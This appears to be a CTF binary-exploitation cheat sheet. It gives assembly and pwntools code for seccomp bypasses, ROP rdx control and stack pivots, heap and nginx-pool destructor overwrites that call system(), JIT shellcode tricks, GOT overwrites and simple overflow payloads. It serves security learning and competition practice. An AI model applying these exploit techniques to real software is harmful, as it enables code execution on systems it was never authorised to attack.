# CTF Pwn - Advanced Techniques

## Seccomp Advanced Techniques

### openat2 Bypass (New Age Pattern)

`openat2` (syscall 437, Linux 5.6+) frequently missed in seccomp filters blocking `open`/`openat`:
```python
# struct open_how { u64 flags; u64 mode; u64 resolve; }  = 24 bytes
# openat2(AT_FDCWD, filename, &open_how, sizeof(open_how))
```

### Conditional Buffer Address Restrictions

Seccomp `SCMP_CMP_LE`/`SCMP_CMP_GE` on buffer addresses:
- `read()` KILL if buf <= code_region + X → read to high addresses
- `write()` KILL if buf >= code_region + Y → write from low addresses

**Bypass:** Read into allowed region, `rep movsb` copy to write-allowed region:
```nasm
lea rsi, [r14 + 0xc01]   ; buf > code_region+0xc00 (passes read check)
xor rax, rax              ; __NR_read
syscall
mov r13, rax
lea rsi, [r14 + 0xc01]   ; src (high)
lea rdi, [r14 + 0x200]   ; dst (low, < code_region+0x400)
mov rcx, r13
rep movsb
mov rdi, 1
lea rsi, [r14 + 0x200]   ; buf < code_region+0x400 (passes write check)
mov rdx, r13
mov rax, 1                ; __NR_write
syscall
```

### Shellcode Construction Without Relocations (pwntools)

pwntools `asm()` fails with forward label references. Fix with manual jmp/call:

```python
body = asm('''
    pop rbx              /* rbx = address after call instruction */
    mov r14, rbx
    and r14, -4096       /* page-align for code_region base */
    mov rsi, rbx         /* filename pointer */
    /* ... rest of shellcode ... */
fail:
    mov rdi, 1
    mov rax, 60
    syscall
''')
call_offset = -(len(body) + 5)
call_instr = b'\xe8' + p32(call_offset & 0xffffffff)
jmp_instr = b'\xeb' + bytes([len(body)]) if len(body) < 128 else b'\xe9' + p32(len(body))
shellcode = jmp_instr + body + call_instr + b"filename.txt\x00"
# call pushes filename address onto stack, pop rbx retrieves it
```

### Seccomp Analysis from Disassembly

```
seccomp_rule_add(ctx, action, syscall_nr, arg_count, ...)
```

`scmp_arg_cmp` struct: `arg` (+0x00, uint), `op` (+0x04, int), `datum_a` (+0x08, u64), `datum_b` (+0x10, u64)

SCMP_CMP operators: `NE=1, LT=2, LE=3, EQ=4, GE=5, GT=6, MASKED_EQ=7`

Default action `0x7fff0000` = `SCMP_ACT_ALLOW`

---

## rdx Control in ROP Chains

After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.

**Solutions:**
1. **pop rdx gadget from libc** — `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
2. **Re-enter binary's read setup** — Jump to code that sets `rdx` before `read`:
   ```python
   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
   # Set rbp first so rbp-0x40 points to target buffer:
   POP_RBP_RET = 0x40113d
   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]

   payload += p64(POP_RBP_RET)
   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
   # WARNING: After read, code continues to printf + leave;ret
   # leave sets rsp=rbp, so you get a stack pivot to rbp!
   ```
3. **Stack pivot via leave;ret** — When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.

---

## Heap Exploitation

- tcache poisoning (glibc 2.26+)
- fastbin dup / double free
- House of Force (old glibc)
- Unsorted bin attack
- Check glibc version: `strings libc.so.6 | grep GLIBC`

**Heap info leaks via uninitialized memory:**
- Error messages outputting user data may include freed chunk metadata
- Freed chunks contain libc pointers (fd/bk in unsorted bin)
- Missing null-termination in sprintf/strcpy leaks adjacent memory
- Trigger error conditions to leak libc/heap base addresses

**Heap feng shui:**
- Arrange heap layout by controlling allocation order/sizes
- Create holes of specific sizes by allocating then freeing
- Place target structures adjacent to overflow source
- Use spray patterns with incremental offsets (e.g., 0x200 steps)

## Custom Allocator Exploitation

Applications may use custom allocators (nginx pools, Apache apr, game engines):

**nginx pool structure:**
- Pools chain allocations with destructor callbacks
- `ngx_destroy_pool()` iterates cleanup handlers
- Overflow to overwrite destructor function pointer + argument
- When pool freed, calls `system(controlled_string)`

**General approach:**
1. Reverse engineer allocator metadata layout
2. Find destructor/callback pointers in structures
3. Overflow to corrupt pointer + first argument
4. Trigger deallocation to call controlled function

```python
# nginx pool exploit pattern
payload = flat({
    0x00: cmd * (0x800 // len(cmd)),      # Command string
    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # Destructor spray
    0x1010: [0x1020, 0x1011],              # Pool metadata
    0x1010+0x50: [HEAP + OFF + 0x800]      # Cleanup handler ptr
}, length=0x1200)
```

## JIT Compilation Exploits

**Pattern (Santa's Christmas Calculator):** Off-by-one in instruction encoding causes misaligned machine code.

**Exploitation flow:**
1. Find the boundary value that triggers wrong instruction form (e.g., 128 vs 127)
2. Misaligned bytes become executable instructions
3. Control `rax` to survive invalid dereferences (point to writable memory)
4. Embed shellcode as operand bytes of subtraction operations
5. Chain 4-byte shellcode blocks with 2-byte `jmp` instructions between them

**2-byte instruction shellcode tricks:**
- `push rdx; pop rsi` = `mov rsi, rdx` in 2 bytes
- `xor eax, eax` = 2 bytes (set syscall number)
- `not dl` = 2 bytes (adjust pointer)
- Use `sys_read` to stage full shellcode on RWX page, then jump to it

## Esoteric Language GOT Overwrite

**Pattern (Pikalang):** Brainfuck/Pikalang interpreter with unbounded tape allows arbitrary memory access.

**Exploitation:**
1. Tape pointer starts at known buffer address
2. Move pointer backward/forward to reach GOT entry (e.g., `strlen@GOT`)
3. Overwrite GOT entry byte-by-byte with `system()` address
4. Next call to overwritten function triggers `system(controlled_string)`

**Key insight:** Unbounded tape = arbitrary read/write primitive relative to buffer base.

## Heap Overlap via Base Conversion

**Pattern (Santa's Base Converter):** Number stored as string in different bases has different lengths.

**Exploitation:**
1. Store number in base with short representation (e.g., base-36)
2. Convert to base with longer representation (e.g., base-2/binary)
3. Longer string overflows into adjacent heap chunk metadata
4. Corrupted chunk overlaps with target allocation

**Limited charset constraint:** Only digits/letters available (0-9, a-z) limits writable byte values.

## Tree Data Structure Stack Underallocation

**Pattern (Christmas Trees):** Imbalanced binary tree causes stack buffer underallocation.

**Vulnerability:** Stack allocation based on balanced tree assumption (`2^depth` nodes), but actual traversal of imbalanced tree uses more stack than allocated buffer, causing overflow.

**Exploitation:** Craft tree structure that causes traversal to overflow buffer → overwrite return address → ret2win (partial overwrite if PIE).

## DNS Record Buffer Overflow

**Pattern (Do Not Strike The Clouds):** Many AAAA records overflow stack buffer in DNS response parser.

**Exploitation:**
1. Set up DNS server returning excessive AAAA records
2. Target binary queries DNS, copies records into fixed-size stack buffer
3. Many records overflow into return address
4. Overwrite with win function address

## Custom Canary Preservation

**Pattern (Canary In The Bitcoin Mine):** Buffer overflow must preserve known canary value.

**Key technique:** Write the exact canary bytes at the correct offset during overflow:
```python
# Buffer: 64 bytes | Canary: "BIRD" (4 bytes) | Target: 1 byte
payload = b'A' * 64 + b'BIRD' + b'X'  # Preserve canary, set target to non-zero
```

**Identification:** Source code shows struct with buffer + canary + flag bool, `gets()` for input.
